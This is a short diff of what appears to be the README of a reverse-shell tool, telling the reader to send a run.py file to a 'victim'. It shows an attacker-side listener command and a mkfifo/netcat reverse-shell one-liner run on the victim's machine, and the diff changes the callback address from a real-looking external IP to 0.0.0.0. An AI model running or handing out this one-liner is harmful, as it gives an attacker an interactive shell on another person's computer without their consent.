@@ -43,6 +43,6 @@ Then send the run.py file to your victim.
 
 
     kali@attacker ~ $ python3 listen.py
-    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 172.104.191.185 9999 >/tmp/f  
+    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f  
            
 made by Treveen
